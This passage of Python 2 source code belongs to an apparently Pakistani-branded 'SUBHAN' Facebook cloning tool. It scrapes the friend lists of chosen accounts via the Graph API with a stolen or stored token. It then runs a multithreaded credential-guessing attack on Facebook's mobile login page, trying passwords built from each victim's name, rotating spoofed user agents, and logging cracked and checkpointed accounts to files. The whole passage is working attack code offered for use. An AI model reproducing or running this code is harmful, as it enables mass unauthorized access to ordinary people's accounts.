        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[*] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()

def ext5():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
    d3=raw_input('[3] Enter ID : ')
    d4=raw_input('[4] Enter ID : ')
    d5=raw_input('[5] Enter ID : ')
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()

def ext6():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
    d3=raw_input('[3] Enter ID : ')
    d4=raw_input('[4] Enter ID : ')
    d5=raw_input('[5] Enter ID : ')
    d6=raw_input('[6] Enter ID : ')
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()
    
def ext7():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
    d3=raw_input('[3] Enter ID : ')
    d4=raw_input('[4] Enter ID : ')
    d5=raw_input('[5] Enter ID : ')
    d6=raw_input('[6] Enter ID : ')
    d7=raw_input('[7] Enter ID : ')
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
    z = json.loads(r7.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()

def ext8():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
    d3=raw_input('[3] Enter ID : ')
    d4=raw_input('[4] Enter ID : ')
    d5=raw_input('[5] Enter ID : ')
    d6=raw_input('[6] Enter ID : ')
    d7=raw_input('[7] Enter ID : ')
    d8=raw_input('[8] Enter ID : ')
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
    z = json.loads(r7.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
    z = json.loads(r8.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()

def ext9():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
    d3=raw_input('[3] Enter ID : ')
    d4=raw_input('[4] Enter ID : ')
    d5=raw_input('[5] Enter ID : ')
    d6=raw_input('[6] Enter ID : ')
    d7=raw_input('[7] Enter ID : ')
    d8=raw_input('[8] Enter ID : ')
    d9=raw_input('[8] Enter ID : ')
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
    z = json.loads(r7.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
    z = json.loads(r8.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r9 = requests.get('https://graph.facebook.com/' + d9 + '/friends?access_token=' + token)
    z = json.loads(r9.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()
    
def ext10():
    rana=[]
    try:
        token=open('token.txt').read()
    except:
        main_system()
    print ""
    d1=raw_input('[1] Enter ID : ')
    d2=raw_input('[2] Enter ID : ')
    d3=raw_input('[3] Enter ID : ')
    d4=raw_input('[4] Enter ID : ')
    d5=raw_input('[5] Enter ID : ')
    d6=raw_input('[6] Enter ID : ')
    d7=raw_input('[7] Enter ID : ')
    d8=raw_input('[8] Enter ID : ')
    d9=raw_input('[8] Enter ID : ')
    d10=raw_input('[10] Enter ID : ')
    
    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
    z = json.loads(r2.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
    z = json.loads(r3.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
    z = json.loads(r4.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
    z = json.loads(r5.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
    z = json.loads(r6.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
    z = json.loads(r7.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
    z = json.loads(r8.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r9 = requests.get('https://graph.facebook.com/' + d9 + '/friends?access_token=' + token)
    z = json.loads(r9.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    r10 = requests.get('https://graph.facebook.com/' + d10 + '/friends?access_token=' + token)
    z = json.loads(r10.text)
    fuck=open(file,'a')
    for i in z['data']:
        uid = i['id']
        na = i['name']
        rana.append(uid + '|' + na)
        fuck.write(uid + '|' + na + '\n')
    fuck.close()
    
    cop=raw_input('[!] File path : ')
    shutil.move(file,cop)
    print ('[*] Your File Save In : '+cop)
    raw_input('[*] Press Enter To Back')
    main_system()





def fileauto():
    os.system('clear')
    print logo
    print ""
    print ""
    try:
        mf=raw_input('[!] Enter path : ')
        print ''
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        n_f_p_pass()
        
        
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    print "\033[1;91m  Cracking Start Please Wait .."
    print "\033[1;91m  Use Flight Mod For For Speed Up"
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
	   "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
"Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                ok=open('SUBHAN-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('SUBHAN-CP.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+"123"
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('SUBHAN-ok.txt', 'a')
                        ok.write(uid+ " | " +pass2+ "\n")
                        ok.close()
                        oks.append(uid+pass2)
                    else:
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                            cp=open('SUBHAN-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                        else:
                            pass3 = first+"last"
                            rana = requests.Session()
                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                            p = rana.get('https://mbasic.facebook.com')
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass3
                                ok=open('SUBHAN-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                oks.append(uid+pass3)
                            else:
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[SUBHAN-CP] "+uid + " | " + pass3
                                    cp=open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                else:
                                    pass4 = first+"12345"
                                    rana = requests.Session()
                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                    p = rana.get('https://mbasic.facebook.com')
                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass4
                                        ok=open('SUBHAN-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        oks.append(uid+pass4)
                                    else:
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[SUBHAN-CP] "+uid + " | " + pass4
                                            cp=open('SUBHAN-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            cps.append(uid+pass4)
                                        else:
                                            pass5 = first+"786"
                                            rana = requests.Session()
                                            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                            p = rana.get('https://mbasic.facebook.com')
                                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass5
                                                ok=open('SUBHAN-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                oks.append(uid+pass5)
                                            else:
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;92m[SUBHAN-Ok] "+uid + " | " + pass5
                                                    cp=open('SUBHAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                            
                    
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] cloning complete result ........"
    print 39*'-'
    print '[!] total ok ids : '+str(len(oks))
    print '[!] total cp ids : '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    main_system()

def n_f_p_pass():
    os.system('clear')
    print logo
    print ""
    ps1=raw_input('[1] name + digit : ')
    ps2=raw_input('[2] name + digit : ')
    ps3=raw_input('[3] name + digit : ')
    ps4=raw_input('[4] name + digit : ')
    print ""
    try:
        mf=raw_input('[!] Enter path : ')
        print ''
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        n_f_p_pass()
        
        
    print "[!] total ids : "+str(len(idx))
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄| lolcat')
    print "\033[1;91m  Cracking Start Please Wait .. "
    print "\033[1;91m  Use Flight Mod For Speed Up"
    os.system('echo " ༄Mr𝙧᭄•─────────────────•༄SUBHAN𝙧᭄"| lolcat')
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        name=name.lower()
        first = name.rsplit(' ')[0]
        try:
            last = name.rsplit(' ')[1]
        except:
            pass
        lines = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
			"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
        try:
            pass1 = name
            rana = requests.Session()
            rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mbasic.facebook.com')
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                ok=open('SUBHAN-ok.txt', 'a')
                ok.write(uid+ " | " +pass1+ "\n")
                ok.close()
                oks.append(uid+pass1)
            else:
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass1
                    cp=open('SUBHAN-OK.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                else:
                    pass2 = first+ps1
                    rana = requests.Session()
                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                    p = rana.get('https://mbasic.facebook.com')
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[SUBHAN-OK] "+uid + " | " + pass2
                        ok=open('SUBHAN-ok.txt', 'a')
